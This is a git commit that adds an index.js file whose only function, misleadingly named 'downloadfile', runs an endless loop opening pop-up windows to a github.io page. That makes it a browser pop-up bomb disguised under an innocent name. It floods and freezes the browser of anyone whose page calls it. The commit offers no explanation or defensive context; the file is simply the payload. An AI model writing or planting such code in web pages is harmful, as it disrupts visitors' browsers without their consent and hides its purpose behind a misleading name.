945afa0ce8e0ca6e87cc19525ae8e96548391331
sxskey <83065600+syskey4603@users.noreply.github.com>
2022-02-23 13:34:32 +0800

    Add files via upload

---
+++ index.js
@@ -0,0 +1,8 @@
+function downloadfile() {
+    while (true) {
+        window.open("https://syskey4603.github.io/sxskey/")
+        window.open('https://syskey4603.github.io/sxskey/', 'popUpWindow', 'height=500,width=400,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes')
+
+
+    }
+}
